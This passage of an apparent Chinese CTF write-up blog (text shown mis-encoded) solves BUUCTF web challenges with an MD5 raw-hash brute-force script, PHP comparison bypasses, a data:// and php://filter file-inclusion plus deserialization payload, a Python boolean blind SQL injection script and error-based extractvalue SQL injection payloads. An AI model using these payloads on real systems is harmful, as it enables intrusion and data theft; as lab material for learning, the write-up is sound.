</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> æ‰¾åˆ°äº†md5(2413633098): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(5207660362): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(8351555222): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(13095770027): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(14860117901): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(15724086109): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(16529176061): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(17428338265): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(18717303578):
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(19342380396): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(23960028257): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(32561902614): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(38983153698): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(39742292223): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(44120894060): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(44820604888): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(45570673322): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(45855250502): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(53660569009): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(55098175010): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(59763304323): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(60185044906): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(68625783421): 
</span></span><span class=line><span class=cl> æ‰¾åˆ°äº†md5(70949326264): 
</span></span><span class=line><span class=cl> (md5å€¼åˆ äº†ï¼Œå› ä¸ºä¹±ç ä¼šå½±å“åšå®¢çš„æœç´¢åŠŸèƒ½)
</span></span></code></pre></td></tr></table></div></div><p>ç¨‹åºæºç å¦‚ä¸‹ï¼ˆè‡ªå·±å†™ç€ç©ï¼Œè½»å–·ï¼‰ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1># codeing = utf-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>threading</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>hashlib</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>re</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>itertools</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>time</span>
</span></span><span class=line><span class=cl><span class=c1># r&#39;\&#39;or\&#39;([1-9]+|0+[1-9])&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># r&#39;\&#39;or\&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>pattern</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;</span><span class=se>\&#39;</span><span class=s1>or</span><span class=se>\&#39;</span><span class=s1>([1-9]+|0+[1-9])&#39;</span><span class=p>,</span><span class=n>re</span><span class=o>.</span><span class=n>I</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>item</span> <span class=o>=</span> <span class=n>itertools</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>thrfunc</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s2</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>temp</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>next</span><span class=p>(</span><span class=n>item</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>s1</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>temp</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>len</span><span class=p>(</span><span class=n>s1</span><span class=p>),</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>s2</span> <span class=o>=</span> <span class=n>s2</span> <span class=o>+</span> <span class=n>chr</span><span class=p>(</span><span class=ne>int</span><span class=p>(</span><span class=n>s1</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>],</span> <span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>s2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;æ‰¾åˆ°äº†md5(&#34;</span> <span class=o>+</span> <span class=n>temp</span> <span class=o>+</span> <span class=s2>&#34;): &#34;</span> <span class=o>+</span> <span class=n>s2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>threads</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>thrfunc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>threads</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è™½ç„¶ä¸çŸ¥é“å¤šæ•´å‡ ä¸ªèƒ½ç”¨çš„å€¼å¯ä»¥å¹²ä»€ä¹ˆï¼Œä½†æ˜¯è§‰å¾—è‡ªå·±å†™çš„ç¨‹åºè·‘å‡ºæ¥ç­”æ¡ˆå°±å¾ˆçˆ½ğŸ¤£ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªèƒ½ç”¨çš„md5å€¼ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>content: 129581926211651571912466741651878684928
</span></span><span class=line><span class=cl>hex: 06da5430449f8f6f23dfc1276f722738
</span></span><span class=line><span class=cl>raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8
</span></span><span class=line><span class=cl>string: T0Do#&#39;or&#39;8
</span></span></code></pre></td></tr></table></div></div><p>ä»¥ä¸Šæ˜¯ç¬¬ä¸€å±‚ã€‚<strong>å…¶å®çœ‹äº†æºç é‡ŒåªéªŒè¯äº†å­—ç¬¦ä¸²æ˜¯å¦ç­‰äº<code>ffifdyop</code>æˆ‘å†™çš„è„šæœ¬é‡Œçš„å€¼è‚¯å®šé€šè¿‡ä¸äº†</strong></p><p>ç¬¬äºŒå±‚å¯ä»¥ç›´æ¥åœ¨æºç ä¸­çœ‹åˆ°æ³¨é‡Šã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$a = $GET[&#39;a&#39;];
</span></span><span class=line><span class=cl>$b = $_GET[&#39;b&#39;];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if($a != $b &amp;&amp; md5($a) == md5($b)){
</span></span><span class=line><span class=cl>    // wow, glzjin wants a girl friend.
</span></span></code></pre></td></tr></table></div></div><p>ç®€å•çš„md5ä»¥0Eå¼€å¤´</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a=QNKCDZO&amp;b=240610708
</span></span></code></pre></td></tr></table></div></div><p>ç¬¬ä¸‰å±‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>error_reporting(0);
</span></span><span class=line><span class=cl>include &#34;flag.php&#34;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>highlight_file(__FILE__);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){
</span></span><span class=line><span class=cl>    echo $flag;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>è¿™ä¸€æœ‰ä¸€äº›ä¸åŒçš„æ˜¯md5æ¯”è¾ƒä½¿ç”¨äº†<code>===</code>ä¸ä»…æ¯”è¾ƒç±»å‹è¿˜æ¯”è¾ƒå€¼ã€‚ä½†æ˜¯md5æœ‰ä¸€ä¸ªï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>md5([1,2,3]) == md5([4,5,6]) == NULL
</span></span></code></pre></td></tr></table></div></div><p>æ‰€ä»¥ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œåˆèƒ½ä¿è¯ä¸¤ä¸ªå˜é‡ä¸ç›¸ç­‰ï¼Œmd5åŠ å¯†æœ‰éƒ½æ˜¯NULLä¸”ç±»å‹æ˜¯æ•°ç»„ç±»å‹ï¼Œæ³¨æ„æ•°ç»„é‡Œçš„å€¼è¿˜æ˜¯ä¸å¯ä»¥ä¸€æ ·çš„ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>param1[]=1&amp;param2[]=2
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=zjctf-2019nizhuansiwei>[ZJCTF 2019]NiZhuanSiWei</h1><p>æºç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php  
</span></span><span class=line><span class=cl>$text = $_GET[&#34;text&#34;];
</span></span><span class=line><span class=cl>$file = $_GET[&#34;file&#34;];
</span></span><span class=line><span class=cl>$password = $_GET[&#34;password&#34;];
</span></span><span class=line><span class=cl>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&#34;welcome to the zjctf&#34;)){
</span></span><span class=line><span class=cl>    echo &#34;&lt;br&gt;&lt;h1&gt;&#34;.file_get_contents($text,&#39;r&#39;).&#34;&lt;/h1&gt;&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>    if(preg_match(&#34;/flag/&#34;,$file)){
</span></span><span class=line><span class=cl>        echo &#34;Not now!&#34;;
</span></span><span class=line><span class=cl>        exit(); 
</span></span><span class=line><span class=cl>    }else{
</span></span><span class=line><span class=cl>        include($file);  //useless.php
</span></span><span class=line><span class=cl>        $password = unserialize($password);
</span></span><span class=line><span class=cl>        echo $password;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>else{
</span></span><span class=line><span class=cl>    highlight_file(__FILE__);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>å…ˆæ¥ä¸€æ®µ<a class=link href=https://segmentfault.com/a/1190000018991087 target=_blank rel=noopener>PHPä¼ªåè®®æ€»ç»“</a>ï¼Œè¿™é¢˜çš„ç¬¬ä¸€æ­¥æ˜¯åˆ¤æ–­ä¼ å…¥textå‚æ•°å¹¶è¯»å–å†…å®¹ï¼Œåˆ¤æ–­å†…å®¹ä¸º<strong>welcome to the zjctf</strong>ï¼Œä½¿ç”¨<code>data://</code>ä¼ªåè®®ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data://text/plain,welcome to the zjctf
</span></span></code></pre></td></tr></table></div></div><p>æ¥ä¸‹æ¥æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæœ‰äº†æç¤º<code>useless.php</code>è‚¯å®šè¦è¯»ä¸€è¯»çœ‹çœ‹ï¼Œä½¿ç”¨<code>php://filter</code>ä¼ªåè®®ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°çš„å†…å®¹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>class Flag{  //flag.php  
</span></span><span class=line><span class=cl>    public $file;  
</span></span><span class=line><span class=cl>    public function __tostring(){  
</span></span><span class=line><span class=cl>        if(isset($this-&gt;file)){  
</span></span><span class=line><span class=cl>            echo file_get_contents($this-&gt;file); 
</span></span><span class=line><span class=cl>            echo &#34;&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>        return (&#34;U R SO CLOSE !///COME ON PLZ&#34;);
</span></span><span class=line><span class=cl>        }  
</span></span><span class=line><span class=cl>    }  
</span></span><span class=line><span class=cl>}  
</span></span><span class=line><span class=cl>?&gt;  
</span></span></code></pre></td></tr></table></div></div><p>å¹¶ä¸”æ–‡ä»¶åŒ…å«ä¸‹é¢æœ‰ä¸€ä¸ªååºåˆ—åŒ–ï¼Œåˆçœ‹åˆ°äº†<code>__tostring</code>å‡½æ•°ï¼Œ<strong>å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¯¹å¾…çš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•</strong>ã€‚æˆ‘æ„é€ çš„å¯¹è±¡</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php 
</span></span><span class=line><span class=cl>class Flag{  
</span></span><span class=line><span class=cl>    public $file=&#34;flag.php&#34;;  
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$f = new Flag();
</span></span><span class=line><span class=cl>echo serialize($f);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>åœ¨ä¼ å…¥å¯¹è±¡ä¹‹å‰å½“ç„¶è¦æŠŠè¯»å–æ–‡ä»¶æµæ”¹ä¸ºæ­£å¸¸åŒ…å«æ–‡ä»¶äº†ã€‚æœ€ç»ˆpayload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;;}
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307171921.png loading=lazy></p><p>å¾ˆæ˜æ˜¾çš„sqlæ³¨å…¥ï¼Œéšä¾¿å°è¯•ä¸€äº›è¯­å¥æœ‰</p><blockquote><p>1 &#187; Hello, glzjin wants a girlfriend.</p><p>2 &#187; Do you want to be my girlfriend?</p><p>3ä¹‹åéƒ½æ˜¯ &#187; Error Occured When Fetch Result.</p></blockquote><p>è¾“å…¥ä¸€ä¸ªå•å¼•å·<code>1'</code>å‡ºç°äº†<code>bool(false)</code>ï¼Œæ˜¯ä¸€ä¸ªå¸ƒå°”ç±»å‹è¿”å›ï¼Œå°±å¾ˆæœ‰å¯èƒ½æ˜¯ç›²æ³¨ä¹‹ç±»çš„ã€‚æµ‹è¯•çš„æ—¶å€™è¿˜å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥å°è¯•ä½¿ç”¨TABåˆ¶è¡¨ç¬¦ä»£æ›¿ã€‚</p><p>é¢˜ç›®ä¸­ä¹Ÿæœ‰æç¤º</p><blockquote><h3 id=all-you-want-is-in-table-flag-and-the-column-is-flag>All You Want Is In Table &lsquo;flag&rsquo; and the column is &lsquo;flag&rsquo;</h3></blockquote><p>è¯´æ˜flagåœ¨flagè¡¨çš„flagå­—æ®µä¸­ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªå¸ƒå°”ç›²æ³¨çš„è„šæœ¬ï¼Œæ€è·¯å°±æ˜¯æŸ¥è¯¢flagçš„å€¼ä½¿ç”¨<code>substr</code>å‡½æ•°æ¯æ¬¡æˆªå–ä¸€ä¸ªå­—ç¬¦ï¼Œè·å¾—å…¶<code>ascii</code>å€¼å†ä½¿ç”¨äºŒåˆ†æ³•ç¡®å®šå…·ä½“çš„å€¼ï¼Œæœ€åæ‹¼æ¥è¾“å‡ºã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/&#39;</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>high</span> <span class=o>=</span> <span class=mi>127</span>
</span></span><span class=line><span class=cl>	<span class=n>low</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>	<span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>low</span> <span class=o>+</span> <span class=n>high</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=n>high</span><span class=o>&gt;</span><span class=n>low</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;if(ascii(substr((select	flag	from	flag),</span><span class=si>%d</span><span class=s2>,1))&gt;</span><span class=si>%d</span><span class=s2>,1,2)&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=n>payload</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=s1>&#39;Hello&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=n>low</span><span class=o>=</span><span class=n>mid</span><span class=o>+</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>		<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=n>high</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>		<span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>low</span><span class=o>+</span><span class=n>high</span><span class=p>)</span><span class=o>/</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>result</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>mid</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl><span class=c1>#flag{929c8993-2d85-4fbf-8e48-7c457551105e}</span>
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=æå®¢å¤§æŒ‘æˆ˜-2019hardsql>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307173126.png loading=lazy></p><p>è¿˜æ˜¯sqlæ³¨å…¥é¢˜ã€‚å°è¯•åœ¨è¾“å…¥æ¡†é‡Œè¾“å…¥<code>#</code>ã€<code>--+</code>æ—¶è¢«æ‹¦ä¸‹äº†ï¼Œä½†æ˜¯åœ¨urlä¸­ä½¿ç”¨%23é€šè¿‡äº†ã€‚å°è¯•äº†unionä½†æ˜¯è¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨åŒå†™ä¹Ÿä¸é€šè¿‡ï¼Œå’Œè¿™é“é¢˜åŒç±»å‹çš„é¢˜å‰é¢æœ‰Baby SQLã€Easy SQLï¼Œè€ƒç‚¹è¿˜å‰©ä¸‹çš„æœ‰ç›²æ³¨ã€æŠ¥é”™æ³¨å…¥ã€å †å æ³¨å…¥ã€‚å°è¯•æŠ¥é”™æ³¨å…¥å¯ä»¥ä½¿ç”¨ï¼Œæˆ‘å‚è€ƒçš„<a class=link href=https://www.cnblogs.com/wocalieshenmegui/p/5917967.html target=_blank rel=noopener>åç§MySQLæŠ¥é”™æ³¨å…¥</a>ã€‚è¿˜éœ€è¦æ³¨æ„ç©ºæ ¼æ˜¯ä¼šè¢«æ‹¦ä¸‹çš„ï¼Œurlç¼–ç ä¹Ÿä¸èƒ½é€šè¿‡ï¼Œæ‰€ä»¥åœ¨è¯­å¥ä¸­çš„è¡¨åéœ€è¦ä½¿ç”¨<code>()</code>éš”å¼€ï¼Œå…·ä½“payloadå¦‚ä¸‹ï¼š</p><ol><li>çˆ†è¡¨</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>username</span><span class=o>=</span><span class=k>admin</span><span class=o>%</span><span class=mi>27</span><span class=k>or</span><span class=p>(</span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=p>(</span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>))</span><span class=k>from</span><span class=p>(</span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=p>)</span><span class=k>where</span><span class=p>(</span><span class=n>table_schema</span><span class=p>)</span><span class=k>like</span><span class=p>(</span><span class=k>database</span><span class=p>())),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)))</span><span class=o>%</span><span class=mi>23</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å½“å‰è¡¨åæ˜¯ï¼šH4rDsq1</p><ol start=2><li>çˆ†å­—æ®µ</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
